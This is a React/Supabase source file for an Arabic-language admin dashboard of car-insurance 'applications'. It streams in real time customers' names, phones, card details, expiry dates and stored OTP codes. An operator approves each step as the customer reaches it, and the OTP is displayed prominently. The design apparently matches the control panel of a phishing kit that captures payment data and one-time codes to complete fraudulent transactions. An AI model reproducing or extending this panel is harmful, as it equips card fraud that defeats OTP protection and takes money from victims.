import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { CheckCircle, XCircle, Clock, Eye } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

interface Application {
  id: string;
  created_at: string;
  full_name: string;
  phone: string;
  insurance_type: string;
  vehicle_manufacturer: string;
  vehicle_model: string;
  vehicle_year: string;
  vehicle_value: number;
  selected_company: string;
  selected_price: string;
  cardholder_name: string;
  card_last_4: string;
  card_type: string;
  expiry_date: string;
  otp_code: string;
  current_step: string;
  step_1_approved: boolean;
  step_2_approved: boolean;
  step_3_approved: boolean;
  payment_approved: boolean;
  otp_approved: boolean;
  status: string;
}

const DashboardApplications = () => {
  const [applications, setApplications] = useState<Application[]>([]);
  const [selectedApp, setSelectedApp] = useState<Application | null>(null);
  const [showDetails, setShowDetails] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    fetchApplications();

    // الاستماع للتحديثات في الوقت الفعلي
    const channel = supabase
      .channel('applications_changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'customer_applications'
        },
        () => {
          fetchApplications();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const fetchApplications = async () => {
    const { data, error } = await supabase
      .from('customer_applications')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) {
      console.error('Error fetching applications:', error);
      return;
    }

    setApplications(data || []);
  };

  const approveStep = async (appId: string, stepField: string) => {
    const { error } = await supabase
      .from('customer_applications')
      .update({ [stepField]: true })
      .eq('id', appId);

    if (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
      return;
    }

    toast({
      title: "تمت الموافقة",
      description: "تم الموافقة على الخطوة بنجاح",
    });

    fetchApplications();
  };

  const getStepBadge = (approved: boolean) => {
    if (approved) {
      return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
    }
    return <Badge variant="destructive"><Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة</Badge>;
  };

  return (
    <div className="container mx-auto p-6">
      <h1 className="text-3xl font-bold mb-6">إدارة طلبات العملاء</h1>

      <div className="grid gap-4">
        {applications.map((app) => (
          <Card key={app.id} className="p-6">
            <div className="flex justify-between items-start">
              <div className="space-y-2">
                <h3 className="text-xl font-bold">{app.full_name}</h3>
                <p className="text-sm text-muted-foreground">📱 {app.phone}</p>
                <p className="text-sm">🚗 {app.vehicle_manufacturer} {app.vehicle_model} ({app.vehicle_year})</p>
                {app.selected_company && (
                  <p className="text-sm">🏢 {app.selected_company} - {app.selected_price} ر.س</p>
                )}
              </div>

              <div className="space-y-2">
                <Button
                  onClick={() => {
                    setSelectedApp(app);
                    setShowDetails(true);
                  }}
                  variant="outline"
                  size="sm"
                >
                  <Eye className="w-4 h-4 mr-2" />
                  عرض التفاصيل
                </Button>
              </div>
            </div>

            <div className="mt-4 pt-4 border-t">
              <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
                <div>
                  <p className="text-xs text-muted-foreground mb-1">الخطوة 1</p>
                  {getStepBadge(app.step_1_approved)}
                  {!app.step_1_approved && (
                    <Button
                      onClick={() => approveStep(app.id, 'step_1_approved')}
                      size="sm"
                      className="mt-2 w-full"
                    >
                      موافقة
                    </Button>
                  )}
                </div>

                <div>
                  <p className="text-xs text-muted-foreground mb-1">الخطوة 2</p>
                  {getStepBadge(app.step_2_approved)}
                  {!app.step_2_approved && app.current_step === 'vehicle_info' && (
                    <Button
                      onClick={() => approveStep(app.id, 'step_2_approved')}
                      size="sm"
                      className="mt-2 w-full"
                    >
                      موافقة
                    </Button>
                  )}
                </div>

                <div>
                  <p className="text-xs text-muted-foreground mb-1">الخطوة 3</p>
                  {getStepBadge(app.step_3_approved)}
                  {!app.step_3_approved && app.current_step === 'insurance_selection' && (
                    <Button
                      onClick={() => approveStep(app.id, 'step_3_approved')}
                      size="sm"
                      className="mt-2 w-full"
                    >
                      موافقة
                    </Button>
                  )}
                </div>

                <div>
                  <p className="text-xs text-muted-foreground mb-1">الدفع</p>
                  {getStepBadge(app.payment_approved)}
                  {!app.payment_approved && app.current_step === 'payment' && (
                    <Button
                      onClick={() => approveStep(app.id, 'payment_approved')}
                      size="sm"
                      className="mt-2 w-full"
                    >
                      موافقة
                    </Button>
                  )}
                </div>

                <div>
                  <p className="text-xs text-muted-foreground mb-1">OTP</p>
                  {getStepBadge(app.otp_approved)}
                  {!app.otp_approved && app.current_step === 'otp' && app.otp_code && (
                    <Button
                      onClick={() => approveStep(app.id, 'otp_approved')}
                      size="sm"
                      className="mt-2 w-full"
                    >
                      موافقة
                    </Button>
                  )}
                </div>
              </div>
            </div>
          </Card>
        ))}
      </div>

      {/* Dialog لعرض التفاصيل الكاملة */}
      <Dialog open={showDetails} onOpenChange={setShowDetails}>
        <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>تفاصيل الطلب الكاملة</DialogTitle>
            <DialogDescription>
              جميع البيانات المدخلة من قبل العميل
            </DialogDescription>
          </DialogHeader>

          {selectedApp && (
            <div className="space-y-6">
              {/* معلومات العميل */}
              <div>
                <h3 className="font-bold mb-2">معلومات العميل</h3>
                <div className="grid grid-cols-2 gap-2 text-sm">
                  <p><span className="font-semibold">الاسم:</span> {selectedApp.full_name}</p>
                  <p><span className="font-semibold">الهاتف:</span> {selectedApp.phone}</p>
                  <p><span className="font-semibold">نوع التأمين:</span> {selectedApp.insurance_type}</p>
                </div>
              </div>

              {/* معلومات المركبة */}
              {selectedApp.vehicle_manufacturer && (
                <div>
                  <h3 className="font-bold mb-2">معلومات المركبة</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">الصانع:</span> {selectedApp.vehicle_manufacturer}</p>
                    <p><span className="font-semibold">الموديل:</span> {selectedApp.vehicle_model}</p>
                    <p><span className="font-semibold">السنة:</span> {selectedApp.vehicle_year}</p>
                    <p><span className="font-semibold">القيمة:</span> {selectedApp.vehicle_value} ر.س</p>
                  </div>
                </div>
              )}

              {/* شركة التأمين المختارة */}
              {selectedApp.selected_company && (
                <div>
                  <h3 className="font-bold mb-2">شركة التأمين المختارة</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">الشركة:</span> {selectedApp.selected_company}</p>
                    <p><span className="font-semibold">السعر:</span> {selectedApp.selected_price} ر.س</p>
                  </div>
                </div>
              )}

              {/* بيانات الدفع */}
              {selectedApp.cardholder_name && (
                <div>
                  <h3 className="font-bold mb-2">بيانات الدفع</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <p><span className="font-semibold">اسم حامل البطاقة:</span> {selectedApp.cardholder_name}</p>
                    <p><span className="font-semibold">آخر 4 أرقام:</span> {selectedApp.card_last_4}</p>
                    <p><span className="font-semibold">نوع البطاقة:</span> {selectedApp.card_type}</p>
                    <p><span className="font-semibold">تاريخ الانتهاء:</span> {selectedApp.expiry_date}</p>
                  </div>
                </div>
              )}

              {/* كود OTP */}
              {selectedApp.otp_code && (
                <div>
                  <h3 className="font-bold mb-2">كود التحقق OTP</h3>
                  <p className="text-2xl font-mono font-bold bg-muted p-4 rounded text-center">
                    {selectedApp.otp_code}
                  </p>
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default DashboardApplications;
